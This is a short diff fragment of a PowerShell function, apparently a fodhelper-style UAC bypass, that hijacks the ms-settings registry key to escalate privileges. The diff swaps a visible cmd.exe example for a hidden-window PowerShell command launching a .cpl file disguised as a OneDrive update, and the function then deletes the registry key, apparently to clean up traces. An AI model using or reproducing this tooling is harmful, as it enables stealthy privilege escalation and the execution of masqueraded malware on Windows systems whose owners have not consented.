@@ -2,7 +2,7 @@ function uac_fod {
     param (
         [string]$command
     )
-    # uac_fod -command 'cmd /c start cmd.exe'
+    # uac_fod -command 'powershell -WindowStyle hidden -c "c:\Users\User\Appdata\Local\Microsoft\OneDrive\OneDriveUpdates.cpl"'
 
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
 
